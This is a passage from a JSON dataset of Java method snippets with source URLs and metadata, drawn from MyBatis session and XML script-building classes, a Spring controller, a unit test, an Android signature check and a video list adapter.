parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32569, "method_name": "delete", "class_name": "SqlSessionManager", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int delete(String statement) {\n    return sqlSessionProxy.delete(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32570, "method_name": "delete", "class_name": "SqlSessionManager", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int delete(String statement, Object parameter) {\n    return sqlSessionProxy.delete(statement, parameter);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32571, "method_name": "getMapper", "class_name": "SqlSessionManager", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "  public <T> T getMapper(Class<T> type) {\n    return getConfiguration().getMapper(type, this);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32572, "method_name": "getConnection", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Connection", "snippet": "  public Connection getConnection() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot get connection.  No managed session is started.\");\n    }\n    return sqlSession.getConnection();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32573, "method_name": "clearCache", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clearCache() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot clear the cache.  No managed session is started.\");\n    }\n    sqlSession.clearCache();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32574, "method_name": "commit", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void commit() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot commit.  No managed session is started.\");\n    }\n    sqlSession.commit();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32575, "method_name": "commit", "class_name": "SqlSessionManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void commit(boolean force) {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot commit.  No managed session is started.\");\n    }\n    sqlSession.commit(force);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32576, "method_name": "rollback", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void rollback() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot rollback.  No managed session is started.\");\n    }\n    sqlSession.rollback();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32577, "method_name": "rollback", "class_name": "SqlSessionManager", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void rollback(boolean force) {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot rollback.  No managed session is started.\");\n    }\n    sqlSession.rollback(force);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32578, "method_name": "flushStatements", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<BatchResult>", "snippet": "  public List<BatchResult> flushStatements() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot rollback.  No managed session is started.\");\n    }\n    return sqlSession.flushStatements();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32579, "method_name": "close", "class_name": "SqlSessionManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void close() {\n    final SqlSession sqlSession = localSqlSession.get();\n    if (sqlSession == null) {\n      throw new SqlSessionException(\"Error:  Cannot close.  No managed session is started.\");\n    }\n    try {\n      sqlSession.close();\n    } finally {\n      localSqlSession.set(null);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["SqlSessionFactory", "SqlSession"], "modifiers": ["public"]}}, {"id": 32580, "method_name": "invoke", "class_name": "SqlSessionInterceptor", "params": ["Object", "Method", "Object"], "throws": ["Throwable"], "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n      final SqlSession sqlSession = SqlSessionManager.this.localSqlSession.get();\n      if (sqlSession != null) {\n        try {\n          return method.invoke(sqlSession, args);\n        } catch (Throwable t) {\n          throw ExceptionUtil.unwrapThrowable(t);\n        }\n      } else {\n        try (SqlSession autoSqlSession = openSession()) {\n          try {\n            final Object result = method.invoke(autoSqlSession, args);\n            autoSqlSession.commit();\n            return result;\n          } catch (Throwable t) {\n            autoSqlSession.rollback();\n            throw ExceptionUtil.unwrapThrowable(t);\n          }\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/session/SqlSessionManager.java", "stars": "15", "class_props": {"extends": null, "implements": ["InvocationHandler"], "modifiers": ["private"]}}, {"id": 32581, "method_name": "listar", "class_name": "ClienteController", "params": ["ModelMap"], "throws": null, "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "    public ModelAndView listar(ModelMap model) {\n        model.addAttribute(\"clientes\", clienteService.recuperar());\n        return new ModelAndView(\"/cliente/list\", model);\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32582, "method_name": "preSalvar", "class_name": "ClienteController", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String preSalvar(@ModelAttribute(\"cliente\") Cliente cliente) {\n        return \"/cliente/add\";\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32583, "method_name": "salvar", "class_name": "ClienteController", "params": ["Cliente", "BindingResult", "RedirectAttributes"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String salvar(@Valid @ModelAttribute(\"cliente\") Cliente cliente, BindingResult result, RedirectAttributes attr) {\n        if (result.hasErrors()) {\n            return \"/cliente/add\";\n        }\n\n        clienteService.salvar(cliente);\n        attr.addFlashAttribute(\"mensagem\", \"Cliente salvo com sucesso.\");\n        return \"redirect:/clientes/listar\";\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32584, "method_name": "preAtualizar", "class_name": "ClienteController", "params": ["Integer", "ModelMap"], "throws": null, "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "    public ModelAndView preAtualizar(@PathVariable(\"id\") Integer id, ModelMap model) {\n        Cliente cliente = clienteService.recuperarPorId(id);\n        model.addAttribute(\"cliente\", cliente);\n        return new ModelAndView(\"/cliente/add\", model);\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32585, "method_name": "atualizar", "class_name": "ClienteController", "params": ["Cliente", "BindingResult", "RedirectAttributes"], "throws": null, "modifiers": ["public"], "return_type": "ModelAndView", "snippet": "    public ModelAndView atualizar(@Valid @ModelAttribute(\"cliente\") Cliente cliente, BindingResult result, RedirectAttributes attr) {\n        if (result.hasErrors()) {\n            return new ModelAndView(\"/cliente/add\");\n        }\n\n        clienteService.atualizar(cliente);\n        attr.addFlashAttribute(\"mensagem\", \"Cliente atualizado com sucesso.\");\n        return new ModelAndView(\"redirect:/clientes/listar\");\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32586, "method_name": "remover", "class_name": "ClienteController", "params": ["Integer", "RedirectAttributes"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String remover(@PathVariable(\"id\") Integer id, RedirectAttributes attr) {\n        clienteService.excluir(id);\n        attr.addFlashAttribute(\"mensagem\", \"Cliente exclu\u00eddo com sucesso.\");\n        return \"redirect:/clientes/listar\";\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/controller/ClienteController.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32587, "method_name": "replaceWithProxyIfNeeded", "class_name": "DeprecatedHandlerProxyConfigurator", "params": ["Object", "Class"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object replaceWithProxyIfNeeded(Object t, Class implClass) {\n        //todo make support for @Deprecate above methods, not class\n        if (implClass.isAnnotationPresent(Deprecated.class)) {\n\n            if (implClass.getInterfaces().length == 0) {\n                return Enhancer.create(implClass, new net.sf.cglib.proxy.InvocationHandler() {\n                    @Override\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                        return getInvocationHandlerLogic(method, args, t);\n                    }\n                });\n            }\n\n\n            return Proxy.newProxyInstance(implClass.getClassLoader(), implClass.getInterfaces(), new InvocationHandler() {\n                @Override\n                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                    return getInvocationHandlerLogic(method, args, t);\n                }\n            });\n        } else {\n            return t;\n        }\n\n    }", "url": "https://raw.githubusercontent.com/Jeka1978/coronadesinfectorlifedemo/master/src/main/java/com/epam/DeprecatedHandlerProxyConfigurator.java", "stars": "60", "class_props": {"extends": null, "implements": ["ProxyConfigurator"], "modifiers": ["public"]}}, {"id": 32588, "method_name": "getInvocationHandlerLogic", "class_name": "DeprecatedHandlerProxyConfigurator", "params": ["Method", "Object", "Object"], "throws": ["IllegalAccessException", "InvocationTargetException"], "modifiers": ["private"], "return_type": "Object", "snippet": "    private Object getInvocationHandlerLogic(Method method, Object[] args, Object t) throws IllegalAccessException, InvocationTargetException {\n        System.out.println(\"********** \u0447\u0442\u043e \u0436 \u0442\u044b \u0434\u0435\u043b\u0430\u0435\u0448\u044c \u0443\u0440\u043e\u0434!! \");\n        return method.invoke(t, args);\n    }", "url": "https://raw.githubusercontent.com/Jeka1978/coronadesinfectorlifedemo/master/src/main/java/com/epam/DeprecatedHandlerProxyConfigurator.java", "stars": "60", "class_props": {"extends": null, "implements": ["ProxyConfigurator"], "modifiers": ["public"]}}, {"id": 32589, "method_name": "login", "class_name": "JobInfoControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void login() throws Exception {\n    MvcResult ret = mockMvc.perform(\n        post(\"/login\")\n            .contentType(MediaType.APPLICATION_FORM_URLENCODED)\n            .param(\"userName\", \"admin\")\n            .param(\"password\", \"123456\")\n    ).andReturn();\n    cookie = ret.getResponse().getCookie(LoginService.LOGIN_IDENTITY_KEY);\n  }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/controller/JobInfoControllerTest.java", "stars": "1", "class_props": {"extends": "AbstractSpringMvcTest", "implements": null, "modifiers": ["public"]}}, {"id": 32590, "method_name": "testAdd", "class_name": "JobInfoControllerTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAdd() throws Exception {\n    MultiValueMap<String, String> parameters = new LinkedMultiValueMap<String, String>();\n    parameters.add(\"jobGroup\", \"1\");\n\n    MvcResult ret = mockMvc.perform(\n        post(\"/jobinfo/pageList\")\n            .contentType(MediaType.APPLICATION_FORM_URLENCODED)\n            //.content(paramsJson)\n            .params(parameters)\n            .cookie(cookie)\n    ).andReturn();\n\n    System.out.println(ret.getResponse().getContentAsString());\n  }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/avon/rga/controller/JobInfoControllerTest.java", "stars": "1", "class_props": {"extends": "AbstractSpringMvcTest", "implements": null, "modifiers": ["public"]}}, {"id": 32591, "method_name": "checkAppSignature", "class_name": "SignUtils", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int checkAppSignature(Context context) {\n        try {\n\n            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);\n\n            for (Signature signature : packageInfo.signatures) {\n                byte[] signatureBytes = signature.toByteArray();\n\n                MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n                md.update(signatureBytes);\n                String currentSignature = Base64.encodeToString(md.digest(), Base64.NO_WRAP);\n\n                Timber.d(\"Detected signature: %s\", currentSignature);\n\n                //compare signatures\n                if (SIGNATURE.equals(currentSignature) || SIGNATURE_DEV.equals(currentSignature)){\n                    return VALID;\n                }\n            }\n        } catch (Exception e) {\n            //assumes an issue in checking signature., but we let the caller decide on what to do.\n        }\n\n        return INVALID;\n\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/utils/SignUtils.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32592, "method_name": "getCount", "class_name": "SwitchListVideoAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return list.size();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/switchplay/SwitchListVideoAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 32593, "method_name": "getItem", "class_name": "SwitchListVideoAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object getItem(int position) {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/switchplay/SwitchListVideoAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 32594, "method_name": "getItemId", "class_name": "SwitchListVideoAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/switchplay/SwitchListVideoAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 32595, "method_name": "getView", "class_name": "SwitchListVideoAdapter", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView(final int position, View convertView, ViewGroup parent) {\n        final ViewHolder holder;\n        if (convertView == null) {\n            holder = new ViewHolder();\n            convertView = inflater.inflate(R.layout.switch_list_video_item, null);\n            holder.gsyVideoPlayer = (SwitchVideo) convertView.findViewById(R.id.video_item_player);\n            holder.imageView = new ImageView(context);\n            convertView.setTag(holder);\n        } else {\n            holder = (ViewHolder) convertView.getTag();\n        }\n        final String urlH = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";\n        final String urlV = \"http://7xjmzj.com1.z0.glb.clouddn.com/20171026175005_JObCxCE2.mp4\";\n        final String url = (position % 2 == 0) ? urlH : urlV;\n        final int coverId = (position % 2 == 0) ? R.mipmap.xxx1 : R.mipmap.xxx2;\n\n\n        //\u9632\u6b62\u9519\u4f4d\u8bbe\u7f6e\n        holder.gsyVideoPlayer.setPlayTag(TAG);\n        holder.gsyVideoPlayer.setPlayPosition(position);\n        SwitchUtil.optionPlayer(holder.gsyVideoPlayer, url, true, \"\u8fd9\u662ftitle\");\n        holder.gsyVideoPlayer.setUpLazy(url, true, null, null, \"\u8fd9\u662ftitle\");\n\n        //\u589e\u52a0\u5c01\u9762\n        holder.imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);\n        holder.imageView.setImageResource(coverId);\n        if (holder.imageView.getParent() != null) {\n            ViewGroup viewGroup = (ViewGroup) holder.imageView.getParent();\n            viewGroup.removeView(holder.imageView);\n        }\n        holder.gsyVideoPlayer.setThumbImageView(holder.imageView);\n\n        if (GSYVideoManager.instance().getPlayTag().equals(SwitchListVideoAdapter.TAG)\n                && (position == GSYVideoManager.instance().getPlayPosition())) {\n            holder.gsyVideoPlayer.getThumbImageViewLayout().setVisibility(View.GONE);\n        } else {\n            holder.gsyVideoPlayer.getThumbImageViewLayout().setVisibility(View.VISIBLE);\n        }\n\n        return convertView;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/switchplay/SwitchListVideoAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 32596, "method_name": "missingNumber", "class_name": "MissingNumber", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int missingNumber(int[] arr) {\n        int XOR = 0;\n\n        for(int i = 0; i < arr.length; i ++) {\n            XOR ^= i ^ arr[i];\n        }\n\n        return XOR ^ arr.length;\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/MissingNumber.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32597, "method_name": "initNodeHandlerMap", "class_name": "XMLScriptBuilder", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void initNodeHandlerMap() {\n    nodeHandlerMap.put(\"trim\", new TrimHandler());\n    nodeHandlerMap.put(\"where\", new WhereHandler());\n    nodeHandlerMap.put(\"set\", new SetHandler());\n    nodeHandlerMap.put(\"foreach\", new ForEachHandler());\n    nodeHandlerMap.put(\"if\", new IfHandler());\n    nodeHandlerMap.put(\"choose\", new ChooseHandler());\n    nodeHandlerMap.put(\"when\", new IfHandler());\n    nodeHandlerMap.put(\"otherwise\", new OtherwiseHandler());\n    nodeHandlerMap.put(\"bind\", new BindHandler());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 32598, "method_name": "parseScriptNode", "class_name": "XMLScriptBuilder", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SqlSource", "snippet": "  public SqlSource parseScriptNode() {\n    MixedSqlNode rootSqlNode = parseDynamicTags(context);\n    SqlSource sqlSource;\n    if (isDynamic) {\n      sqlSource = new DynamicSqlSource(configuration, rootSqlNode);\n    } else {\n      sqlSource = new RawSqlSource(configuration, rootSqlNode, parameterType);\n    }\n    return sqlSource;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 32599, "method_name": "parseDynamicTags", "class_name": "XMLScriptBuilder", "params": ["XNode"], "throws": null, "modifiers": ["protected"], "return_type": "MixedSqlNode", "snippet": "  protected MixedSqlNode parseDynamicTags(XNode node) {\n    List<SqlNode> contents = new ArrayList<>();\n    NodeList children = node.getNode().getChildNodes();\n    for (int i = 0; i < children.getLength(); i++) {\n      XNode child = node.newXNode(children.item(i));\n      if (child.getNode().getNodeType() == Node.CDATA_SECTION_NODE || child.getNode().getNodeType() == Node.TEXT_NODE) {\n        String data = child.getStringBody(\"\");\n        TextSqlNode textSqlNode = new TextSqlNode(data);\n        if (textSqlNode.isDynamic()) {\n          contents.add(textSqlNode);\n          isDynamic = true;\n        } else {\n          contents.add(new StaticTextSqlNode(data));\n        }\n      } else if (child.getNode().getNodeType() == Node.ELEMENT_NODE) { // issue #628\n        String nodeName = child.getNode().getNodeName();\n        NodeHandler handler = nodeHandlerMap.get(nodeName);\n        if (handler == null) {\n          throw new BuilderException(\"Unknown element <\" + nodeName + \"> in SQL statement.\");\n        }\n        handler.handleNode(child, contents);\n        isDynamic = true;\n      }\n    }\n    return new MixedSqlNode(contents);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": "BaseBuilder", "implements": null, "modifiers": ["public"]}}, {"id": 32600, "method_name": "handleNode", "class_name": "BindHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      final String name = nodeToHandle.getStringAttribute(\"name\");\n      final String expression = nodeToHandle.getStringAttribute(\"value\");\n      final VarDeclSqlNode node = new VarDeclSqlNode(name, expression);\n      targetContents.add(node);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32601, "method_name": "handleNode", "class_name": "TrimHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      String prefix = nodeToHandle.getStringAttribute(\"prefix\");\n      String prefixOverrides = nodeToHandle.getStringAttribute(\"prefixOverrides\");\n      String suffix = nodeToHandle.getStringAttribute(\"suffix\");\n      String suffixOverrides = nodeToHandle.getStringAttribute(\"suffixOverrides\");\n      TrimSqlNode trim = new TrimSqlNode(configuration, mixedSqlNode, prefix, prefixOverrides, suffix, suffixOverrides);\n      targetContents.add(trim);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32602, "method_name": "handleNode", "class_name": "WhereHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      WhereSqlNode where = new WhereSqlNode(configuration, mixedSqlNode);\n      targetContents.add(where);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32603, "method_name": "handleNode", "class_name": "SetHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      SetSqlNode set = new SetSqlNode(configuration, mixedSqlNode);\n      targetContents.add(set);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32604, "method_name": "handleNode", "class_name": "ForEachHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      String collection = nodeToHandle.getStringAttribute(\"collection\");\n      String item = nodeToHandle.getStringAttribute(\"item\");\n      String index = nodeToHandle.getStringAttribute(\"index\");\n      String open = nodeToHandle.getStringAttribute(\"open\");\n      String close = nodeToHandle.getStringAttribute(\"close\");\n      String separator = nodeToHandle.getStringAttribute(\"separator\");\n      ForEachSqlNode forEachSqlNode = new ForEachSqlNode(configuration, mixedSqlNode, collection, index, item, open, close, separator);\n      targetContents.add(forEachSqlNode);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32605, "method_name": "handleNode", "class_name": "IfHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      String test = nodeToHandle.getStringAttribute(\"test\");\n      IfSqlNode ifSqlNode = new IfSqlNode(mixedSqlNode, test);\n      targetContents.add(ifSqlNode);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32606, "method_name": "handleNode", "class_name": "OtherwiseHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      MixedSqlNode mixedSqlNode = parseDynamicTags(nodeToHandle);\n      targetContents.add(mixedSqlNode);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32607, "method_name": "handleNode", "class_name": "ChooseHandler", "params": ["XNode", "List<SqlNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handleNode(XNode nodeToHandle, List<SqlNode> targetContents) {\n      List<SqlNode> whenSqlNodes = new ArrayList<>();\n      List<SqlNode> otherwiseSqlNodes = new ArrayList<>();\n      handleWhenOtherwiseNodes(nodeToHandle, whenSqlNodes, otherwiseSqlNodes);\n      SqlNode defaultSqlNode = getDefaultSqlNode(otherwiseSqlNodes);\n      ChooseSqlNode chooseSqlNode = new ChooseSqlNode(whenSqlNodes, defaultSqlNode);\n      targetContents.add(chooseSqlNode);\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/XMLScriptBuilder.java", "stars": "15", "class_props": {"extends": null, "implements": ["NodeHandler"], "modifiers": ["private"]}}, {"id": 32608, "method_name": "handleWhenOtherwiseNodes", "class_name": "ChooseHandler", "params": ["XNode", "List<SqlNode>", "List<SqlNode>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleWhenOtherwiseNodes(XNode chooseSqlNode, List<SqlNode> ifSqlNodes, List<SqlNode> defaultSqlNodes) {\n      List<XNode> children = chooseSqlNode.getChildren();\n      for (XNode child : children) {\n        String nodeName = child.getNode().getNodeName();\n        NodeHandler handler = nodeHandlerMap.get(nodeName);\n       